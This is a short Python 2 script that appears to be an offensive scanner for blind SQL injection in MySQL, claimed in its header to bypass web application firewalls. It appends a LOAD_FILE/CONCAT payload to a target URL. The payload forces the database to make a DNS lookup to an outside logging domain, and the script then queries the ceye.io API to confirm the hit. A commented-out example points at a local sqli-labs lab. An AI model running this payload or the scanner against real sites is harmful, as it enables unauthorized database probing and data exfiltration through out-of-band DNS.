#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import random
from config import *
import json
import time
from termcolor import *
import sys

'''
 Check if target have SqlInjection with dnslog (can bypass waf)
 Now just testing MySql
'''

def dnsPaylod(randomcode):
	# main payload
	# print DNSurl
	mainPayload = r"LOAD_FILE(CONCAT('\\\\',(SELECT {md5}),'.{dns}\\abc'))"
	return mainPayload.format(md5=randomcode, dns=DNSurl)

def getDnsData(taskname):
	try:
		APIurl = 'http://api.ceye.io/v1/records?token={token}&type={dns}&filter={filter}'.format(token=APItoken, dns='dns', filter=taskname)

		# print APIurl

		r = requests.get(APIurl)

		data = json.loads(r.text)

		# print data

		result = data['data'][0]['name'].split('.')[0]
		return result
	except Exception,e:
		# print '[*]Error message:{}'.format(e.message)
		return e.message

def randomcode():
	return ''.join([random.choice('123456789') for j in range(4)])

def check(url):

	print '[*]Checking target: {}\n'.format(url)

	patterns = []
	for i in patternClose:
		for j in patternLink:
			pattern = '{} {}'.format(i,j)
			patterns.append(pattern)

	for i in patterns:
		taskcode = randomcode()
		payload = '{} {}--+'.format(i,dnsPaylod(taskcode))
		
		# print url+payload

		r = requests.get(url+payload, headers=headers, timeout=timeout)
		result = getDnsData(taskcode)

		if taskcode == result:
			target = url+i+' ({})--+'
			print '[*]Found SqlInjection!\n\nPayload:{}'.format(colored(url+payload,'red'))
			print 'Target :{}'.format(colored(target,'red'))
			break
	
# if __name__ == '__main__':
# 	start_time = time.strftime("%Y-%m-%d %H:%M:%S")
# 	banner()

# 	print '[-]{}\n'.format(start_time)
# 	try:
# 		url = 'http://10.211.55.9/sqli-labs/Less-9/?id=1'
# 		check(url)
# 	except KeyboardInterrupt:
# 		print "Ctrl C - Stopping Client"
# 		sys.exit(1)





